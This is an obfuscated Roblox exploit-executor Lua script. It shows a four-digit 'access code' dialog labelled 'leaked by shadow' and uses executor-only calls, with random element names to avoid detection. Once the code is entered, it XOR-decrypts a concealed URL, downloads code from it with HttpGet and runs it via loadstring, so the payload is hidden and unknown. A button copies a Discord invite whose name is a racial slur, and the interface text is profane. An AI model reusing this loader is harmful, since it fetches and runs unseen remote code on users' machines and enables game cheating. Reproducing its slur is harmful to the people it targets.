pcall(function()
  if setthreadidentity then
    setthreadidentity(7)
  end
end)

local object = game

local function safeCall(val)
  local val2, success = pcall(function() return object:GetService(val) end)

  if val2 and success then
    return cloneref and cloneref(success) or success
  end

  return nil
end

local players = safeCall("Players")
local tweenService = safeCall("TweenService")
local userInputService = safeCall("UserInputService")
local coreGui = safeCall("CoreGui")

local function helper()
  local text = ""

  for i = 1, math.random(15, 27) do
    text = text .. string.char(math.random(1, 250))
  end

  return text
end

local function helper2(val3)
  if type(val3) ~= "string" or #val3 ~= 4 then
    return false
  else
    local val4 = 2050956445
    local count = 0

    while true do
      count = 1 + count

      if not (4 >= count) then
        break
      end

      local byte = val3:byte(count)

      if not byte then
        return false
      end

      val4 = (val4 * 33 + byte) % 4294967296
    end

    return val4 == 2275782610
  end
end

local function helper3(val5, val6)
  local floorVal = val5
  local floorVal2 = val6

  if bit32 and bit32.bxor then
    return bit32.bxor(floorVal, floorVal2)
  end

  if bit and bit.bxor then
    return bit.bxor(floorVal, floorVal2)
  else
    local val7 = 1
    local total = 0

    while floorVal > 0 or floorVal2 > 0 do
      if floorVal % 2 ~= floorVal2 % 2 then
        total = total + val7
      end

      floorVal = math.floor(floorVal / 2)
      floorVal2 = math.floor(floorVal2 / 2)
      val7 = val7 * 2
    end

    return total
  end
end

local val8 = {
  80, 69, 65, 71, 75, 11, 26, 24, 95, 88, 70, 67, 22, 86, 92, 67, 80, 68, 87, 66, 75, 84, 71, 84, 87, 95, 65, 82, 86, 69, 27, 84, 87, 92, 26, 121, 93, 73, 65, 112, 93, 95, 123, 66, 23, 9, 13, 84, 15, 83, 83, 86, 1, 87, 1, 1, 9, 1, 1, 15, 11, 84, 81, 85, 91, 6, 12, 14, 14, 7, 80, 15, 94, 9, 7, 85, 91, 30, 71, 86, 79, 30, 82, 94, 75, 69, 83, 94, 84, 84, 4, 25, 76, 73, 65, }

local function helper4(val9)
  if type(val9) ~= "string" or #val9 == 0 then
    return ""
  else
    local val10 = {}
    local val11 = #val9
    local val12 = #val8
    local count2 = 0

    while true do
      count2 = 1 + count2

      if not (val12 >= count2) then
        break
      end

      local val13 = count2
      local byte2 = val9:byte((val13 - 1) % val11 + 1)
      val10[val13] = string.char(helper3(val8[val13], byte2))
    end

    return table.concat(val10)
  end
end

local val14 = {
  bg = Color3.fromRGB(22, 22, 30), digitBg = Color3.fromRGB(36, 36, 54), border = Color3.fromRGB(58, 58, 80), accent = Color3.fromRGB(0, 200, 83), text = Color3.fromRGB(150, 150, 170), white = Color3.fromRGB(255, 255, 255), success = Color3.fromRGB(0, 210, 90), failure = Color3.fromRGB(215, 50, 50), discord = Color3.fromRGB(88, 101, 242), discordH = Color3.fromRGB(71, 82, 200), }

local tweenInfo = TweenInfo.new(0.16, Enum.EasingStyle.Quad)
local tweenInfo2 = TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
local val15
pcall(function() val15 = gethui and gethui() or coreGui end)

if not val15 then
  pcall(function()
    val15 = coreGui
      or players and players.LocalPlayer
        and players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
  end)
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = helper()
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = val15

local function createUICorner(parent, val16)
  local uiCorner = Instance.new("UICorner")
  uiCorner.Name = helper()
  uiCorner.CornerRadius = UDim.new(0, val16 or 8)
  uiCorner.Parent = parent
end

local function createUIStroke(parent2, val17, val18)
  local uiStroke = Instance.new("UIStroke")
  uiStroke.Name = helper()
  uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  uiStroke.Color = val17 or val14.border
  uiStroke.Thickness = val18 or 1.5
  uiStroke.Transparency = 1
  uiStroke.Parent = parent2

  return uiStroke
end

local function safeCall2(val20, val19, val21)
  pcall(function() tweenService:Create(val20, val19, val21):Play() end)
end

local frame = Instance.new("Frame")
frame.Name = helper()
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Size = UDim2.new(0, 420, 0, 176)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = val14.bg
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 1
frame.Parent = screenGui

createUICorner(frame, 14)
local val22 = createUIStroke(frame, Color3.fromRGB(40, 40, 60), 1.5)

local uiScale = Instance.new("UIScale")
uiScale.Name = helper()
uiScale.Scale = 0.82
uiScale.Parent = frame

local frame2 = Instance.new("Frame")
frame2.Name = helper()
frame2.Size = UDim2.new(0, 100, 0, 3)
frame2.Position = UDim2.new(0.5, -50, 0, 0)
frame2.BackgroundColor3 = val14.accent
frame2.BorderSizePixel = 0
frame2.BackgroundTransparency = 1
frame2.Parent = frame

createUICorner(frame2, 2)

local textLabel = Instance.new("TextLabel")
textLabel.Name = helper()
textLabel.Size = UDim2.new(1, 0, 0, 24)
textLabel.Position = UDim2.new(0, 0, 0, 12)
textLabel.BackgroundTransparency = 1
textLabel.Text = "ACCESS CODE - 8157"
textLabel.TextColor3 = val14.white
textLabel.TextSize = 15
textLabel.Font = Enum.Font.GothamBold
textLabel.TextTransparency = 1
textLabel.Parent = frame

local textLabel2 = Instance.new("TextLabel")
textLabel2.Name = helper()
textLabel2.Size = UDim2.new(1, 0, 0, 15)
textLabel2.Position = UDim2.new(0, 0, 0, 38)
textLabel2.BackgroundTransparency = 1
textLabel2.Text = "leaked by shadow"
textLabel2.TextColor3 = val14.text
textLabel2.TextSize = 13
textLabel2.Font = Enum.Font.Gotham
textLabel2.TextTransparency = 1
textLabel2.Parent = frame

local val23 = {}
local val24 = { "", "", "", "" }
local val25 = 0
local val26 = false

for j = 1, 4 do
  local frame3 = Instance.new("Frame")
  frame3.Name = helper()
  frame3.Size = UDim2.new(0, 64, 0, 68)
  frame3.Position = UDim2.new(0, 64 + (j - 1) * 76, 0, 60)
  frame3.BackgroundColor3 = val14.digitBg
  frame3.BorderSizePixel = 0
  frame3.BackgroundTransparency = 1
  frame3.Parent = frame

  createUICorner(frame3, 12)
  local sk = createUIStroke(frame3, val14.border, 1.5)

  local textLabel3 = Instance.new("TextLabel")
  textLabel3.Name = helper()
  textLabel3.Size = UDim2.new(1, 0, 1, 0)
  textLabel3.BackgroundTransparency = 1
  textLabel3.Text = "â"
  textLabel3.TextColor3 = Color3.fromRGB(52, 52, 72)
  textLabel3.TextSize = 16
  textLabel3.Font = Enum.Font.GothamBold
  textLabel3.TextTransparency = 1
  textLabel3.Parent = frame3

  local textLabel4 = Instance.new("TextLabel")
  textLabel4.Name = helper()
  textLabel4.Size = UDim2.new(1, 0, 1, 0)
  textLabel4.BackgroundTransparency = 1
  textLabel4.Text = ""
  textLabel4.TextColor3 = val14.white
  textLabel4.TextSize = 32
  textLabel4.Font = Enum.Font.GothamBold
  textLabel4.TextTransparency = 1
  textLabel4.Parent = frame3

  val23[j] = {
    frame = frame3, lbl = textLabel4, dash = textLabel3, sk = sk, }
end

local textButton = Instance.new("TextButton")
textButton.Name = helper()
textButton.Size = UDim2.new(0, 148, 0, 30)
textButton.Position = UDim2.new(0.5, -74, 0, 136)
textButton.BackgroundColor3 = val14.discord
textButton.BorderSizePixel = 0
textButton.Text = "#fuck the discord#"
textButton.TextColor3 = val14.white
textButton.TextSize = 12
textButton.Font = Enum.Font.GothamBold
textButton.BackgroundTransparency = 1
textButton.TextTransparency = 1
textButton.Parent = frame

createUICorner(textButton, 7)
local val27 = false

textButton.MouseEnter:Connect(function()
  if val27 then
    return
  end

  safeCall2(textButton, tweenInfo, { BackgroundColor3 = val14.discordH })
end)

textButton.MouseLeave:Connect(function()
  if val27 then
    return
  end

  safeCall2(textButton, tweenInfo, { BackgroundColor3 = val14.discord })
end)

textButton.MouseButton1Click:Connect(function()
  if val27 then
    return
  end

  val27 = true

  pcall(function()
    if setclipboard then
      setclipboard("https://discord.gg/niggers")
    elseif toclipboard then
      toclipboard("https://discord.gg/niggers")
    end
  end)

  local tweenInfo3 = TweenInfo.new(0.18, Enum.EasingStyle.Quad)
  safeCall2(textButton, tweenInfo3, { BackgroundColor3 = val14.success })
  textButton.Text = "link copied!"

  task.delay(1.6, function()
    safeCall2(textButton, tweenInfo3, { BackgroundColor3 = val14.discord })
    textButton.Text = "#fuck the discord#"
    val27 = false
  end)
end)

local val28 = {}

for k = 1, 4 do
  local textBox = Instance.new("TextBox")
  textBox.Name = helper()
  textBox.Size = UDim2.new(1, 0, 1, 0)
  textBox.BackgroundTransparency = 1
  textBox.TextTransparency = 1
  textBox.Text = ""
  textBox.ClearTextOnFocus = true
  textBox.PlaceholderText = ""
  textBox.Font = Enum.Font.GothamBold
  textBox.TextSize = 32
  textBox.Parent = val23[k].frame

  val28[k] = textBox
end

local function helper5(val29, val30)
  val24[val29] = val30
  val23[val29].lbl.Text = val30
  safeCall2(val23[val29].dash, tweenInfo, { TextTransparency = val30 ~= "" and 1 or 0 })
end

local val31 = {}

for m = 1, 4 do
  val31[m] = false
end

local function helper6()
  local count3 = 0

  while true do
    count3 = 1 + count3

    if not (count3 <= 4) then
      break
    end

    local val32 = count3
    val31[val32] = true
    val28[val32].Text = ""
    val31[val32] = false
    val24[val32] = ""

    local element = val23[val32]
    element.lbl.Text = ""

    local tweenInfo4 = TweenInfo.new(0.18, Enum.EasingStyle.Quad)

    safeCall2(element.frame, tweenInfo4, { BackgroundColor3 = val14.digitBg })
    safeCall2(element.sk, tweenInfo4, { Color = val14.border, Transparency = 0.45 })
    safeCall2(element.lbl, tweenInfo4, { TextColor3 = val14.white })
    safeCall2(element.dash, tweenInfo4, { TextTransparency = 0 })
  end
end

local udim = UDim2.new(0.5, 0, 0.5, 0)
local connect, helper7

local function helper8(val33, val34)
  val26 = true
  local count4 = 0

  while true do
    count4 = 1 + count4

    if not (count4 <= 4) then
      break
    end

    val28[count4]:ReleaseFocus()
  end

  TweenInfo.new(0.14, Enum.EasingStyle.Quad)

  if val33 then
    task.delay(0.8, function()
      local tweenInfo5 = TweenInfo.new(0.4, Enum.EasingStyle.Quad)

      safeCall2(uiScale, tweenInfo5, { Scale = 0.88 })
      safeCall2(frame, tweenInfo5, { BackgroundTransparency = 1 })
      safeCall2(val22, tweenInfo5, { Transparency = 1 })
      safeCall2(frame2, tweenInfo5, { BackgroundTransparency = 1 })
      safeCall2(textLabel, tweenInfo5, { TextTransparency = 1 })
      safeCall2(textLabel2, tweenInfo5, { TextTransparency = 1 })
      safeCall2(textButton, tweenInfo5, { BackgroundTransparency = 1, TextTransparency = 1 })

      for n = 1, 4 do
        local element2 = val23[n]

        safeCall2(element2.frame, tweenInfo5, { BackgroundTransparency = 1 })
        safeCall2(element2.sk, tweenInfo5, { Transparency = 1 })
        safeCall2(element2.lbl, tweenInfo5, { TextTransparency = 1 })
        safeCall2(element2.dash, tweenInfo5, { TextTransparency = 1 })
      end

      task.delay(0.45, function()
        if connect then
          pcall(function() connect:Disconnect() end)
          connect = nil
        end

        pcall(function() screenGui:Destroy() end)

        pcall(function()
          local val35 = helper4(val34)
          local val36, httpResponse = pcall(function() return object:HttpGet(val35) end)

          if val36 and type(httpResponse) == "string" and #httpResponse > 0 then
            local val37, loader = pcall(function() return loadstring(httpResponse) end)

            if val37 and type(loader) == "function" then
              task.spawn(loader)
            end
          end
        end)
      end)
    end)
  else
    helper7()

    task.delay(0.55, function()
      helper6()

      task.delay(0.22, function()
        val26 = false
        val25 = 0

        if val28[1] then
          val28[1]:CaptureFocus()
        end
      end)
    end)
  end
end

function helper7()
  safeCall2(frame, TweenInfo.new(0.07, Enum.EasingStyle.Quad), {
    Position = UDim2.new(0.5, 10, 0.5, 0), })

  task.delay(0.07, function()
    safeCall2(frame, TweenInfo.new(0.07), { Position = UDim2.new(0.5, -10, 0.5, 0) })
  end)

  task.delay(0.14, function()
    safeCall2(frame, TweenInfo.new(0.07), { Position = UDim2.new(0.5, 5, 0.5, 0) })
  end)

  task.delay(0.21000000000000002, function()
    safeCall2(frame, TweenInfo.new(0.07), { Position = udim })
  end)
end

for i6 = 1, 4 do
  local val38 = i6
  local element3 = val28[val38]
  local element4 = val23[val38]

  element3.Focused:Connect(function()
    val25 = val38

    if val26 then
      return
    end

    safeCall2(element4.frame, tweenInfo, { BackgroundColor3 = Color3.fromRGB(26, 44, 34) })
    safeCall2(element4.sk, tweenInfo, { Color = val14.accent, Transparency = 0 })
  end)

  element3.FocusLost:Connect(function()
    if val26 then
      return
    end

    safeCall2(element4.frame, tweenInfo, { BackgroundColor3 = val14.digitBg })
    safeCall2(element4.sk, tweenInfo, { Color = val14.border, Transparency = val24[val38] ~= "" and 0 or 0.45 })
  end)

  element3:GetPropertyChangedSignal("Text"):Connect(function()
    local val39 = val31[val38] or val26
    local val40

    if val39 then
      return
    else
      local gsub = element3.Text:gsub("[^%d]", "")

      if #gsub > 1 then
        val31[val38] = true
        element3.Text = ""
        val31[val38] = false
        local val41 = val38

        for match in gsub:gmatch("%d") do
          if val41 <= 4 then
            val31[val41] = true
            val28[val41].Text = match
            val31[val41] = false
            helper5(val41, match)
            val41 = val41 + 1
          end
        end

        if val41 > 4 then
          val40 = table.concat(val24)

          if #val40 == 4 and not val26 then
            task.defer(function() helper8(helper2(val40), val40) end)
          end
        elseif val41 <= 4 and val28[val41] then
          val28[val41]:CaptureFocus()
        end

        return
      end

      val31[val38] = true
      element3.Text = gsub
      val31[val38] = false
      helper5(val38, gsub)

      if gsub ~= "" then
        task.defer(function()
          if val38 < 4 then
            val28[val38 + 1]:CaptureFocus()
          else
            local val42 = table.concat(val24)

            if #val42 == 4 and not val26 then
              helper8(helper2(val42), val42)
            end
          end
        end)
      end

      return
    end
  end)
end

connect = userInputService.InputBegan:Connect(function(input, p16)
  if input.KeyCode ~= Enum.KeyCode.Backspace then
    return
  end

  if val26 or val25 < 2 then
    return
  else
    local val43 = false

    for index, value in ipairs(val28) do
      if value:IsFocused() then
        val43 = true
        break
      end
    end

    if not val43 then
      return
    end

    if val24[val25] == "" and val28[val25 - 1] then
      val28[val25 - 1]:CaptureFocus()
    end

    return
  end
end)

local function helper9()
  safeCall2(uiScale, tweenInfo2, { Scale = 1 })
  safeCall2(frame, TweenInfo.new(0.28, Enum.EasingStyle.Quad), { BackgroundTransparency = 0 })
  safeCall2(val22, TweenInfo.new(0.28, Enum.EasingStyle.Quad), { Transparency = 0 })

  task.delay(0.1, function()
    local tweenInfo6 = TweenInfo.new(0.25, Enum.EasingStyle.Quad)

    safeCall2(frame2, tweenInfo6, { BackgroundTransparency = 0 })
    safeCall2(textLabel, tweenInfo6, { TextTransparency = 0 })
    safeCall2(textLabel2, tweenInfo6, { TextTransparency = 0 })

    local count5 = 0

    while true do
      count5 = 1 + count5

      if not (count5 <= 4) then
        break
      end

      local val44 = count5

      task.delay((val44 - 1) * 0.06, function()
        local element5 = val23[val44]

        safeCall2(element5.frame, tweenInfo6, { BackgroundTransparency = 0 })
        safeCall2(element5.dash, tweenInfo6, { TextTransparency = 0 })
        safeCall2(element5.sk, tweenInfo6, { Transparency = 0.45 })
        safeCall2(element5.lbl, tweenInfo6, { TextTransparency = 0 })
      end)
    end

    task.delay(0.32, function()
      safeCall2(textButton, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0, TextTransparency = 0, })
    end)
  end)
end

helper9()

task.delay(0.6, function()
  if val28[1] then
    val28[1]:CaptureFocus()
  end
end)
